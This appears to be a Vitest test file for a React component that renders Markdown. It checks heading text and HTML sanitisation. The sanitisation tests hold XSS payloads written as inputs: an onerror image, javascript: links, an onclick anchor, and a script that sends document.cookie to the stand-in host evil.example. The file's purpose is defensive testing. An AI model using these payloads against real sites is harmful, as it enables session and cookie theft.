import { describe, expect, it } from 'vitest';
import { render, screen } from '@testing-library/react';
import { ThingContent } from '../src/index';

describe('ThingContent', () => {
  it('renders the Markdown, parsed', () => {
    const { container } = render(
      <ThingContent title="Hello" markdown={'A paragraph with **bold** text.\n\n- one\n- two'} />,
    );

    expect(screen.getByRole('heading', { name: 'Hello' })).toBeInTheDocument();
    // The counterpart to the opened Thing's source editor: here the markers are
    // consumed and real elements come out (ADR 0011).
    expect(container.querySelector('strong')?.textContent).toBe('bold');
    expect(container.querySelectorAll('li')).toHaveLength(2);
  });

  /**
   * The Title ladder is the Thing front's and nothing else's (ADR 0083). A
   * presented Thing is a different surface with a different frame around it, so
   * it draws the Thing's **name** — and a heading is a single line of text
   * whatever the string handed to it contains, so a Title reaching one whole
   * would draw its lines run together with a space between them.
   */
  it('heads a presented Thing with the Thing’s name', () => {
    render(<ThingContent title={'Auth\nHow a session begins'} markdown="Body." />);

    expect(screen.getByRole('heading', { name: 'Auth' })).toBeInTheDocument();
    expect(screen.queryByText(/How a session begins/u)).toBeNull();
  });

  /**
   * The HTML goes in through `dangerouslySetInnerHTML`, so what `marked` emits
   * reaches the DOM. `marked` has had no `sanitize` option since v5 and passes
   * inline HTML through verbatim, which made every one of these live.
   *
   * These are asserted on the rendered DOM rather than on a sanitiser call,
   * because the property that matters is "no executable attribute survives into
   * the document", not "a particular function was invoked".
   */
  describe('sanitises the HTML it injects', () => {
    it('strips event-handler attributes', () => {
      const { container } = render(
        <ThingContent title="T" markdown={'<img src=x onerror="alert(document.domain)">'} />,
      );

      const img = container.querySelector('img');
      expect(img).not.toBeNull();
      // The element survives — sanitising is not escaping, and a thing that
      // legitimately embeds an image should still show one.
      expect(img?.getAttribute('onerror')).toBeNull();
      expect(container.innerHTML).not.toContain('onerror');
    });

    it('strips javascript: hrefs while keeping the link', () => {
      const { container } = render(
        <ThingContent title="T" markdown="[click](javascript:alert(1))" />,
      );

      // Assert the anchor survives, not just that the scheme is gone: deleting
      // the whole element would satisfy the second check and quietly turn
      // sanitising into censoring.
      const link = container.querySelector('a');
      expect(link).not.toBeNull();
      expect(link?.textContent).toBe('click');
      expect(link?.getAttribute('href')).toBeNull();
      expect(container.innerHTML).not.toContain('javascript:');
    });

    it('drops script and iframe elements entirely', () => {
      const { container } = render(
        <ThingContent
          title="T"
          markdown={
            '<script>fetch("//evil.example/"+document.cookie)</script>\n\n' +
            '<iframe src="javascript:alert(1)"></iframe>'
          }
        />,
      );

      expect(container.querySelector('script')).toBeNull();
      expect(container.querySelector('iframe')).toBeNull();
      expect(container.innerHTML).not.toContain('evil.example');
    });

    it('strips inline handlers on anchors', () => {
      const { container } = render(
        <ThingContent title="T" markdown={'<a href="#" onclick="alert(1)">x</a>'} />,
      );

      expect(container.querySelector('a')?.getAttribute('onclick')).toBeNull();
      expect(container.innerHTML).not.toContain('onclick');
    });
  });
});
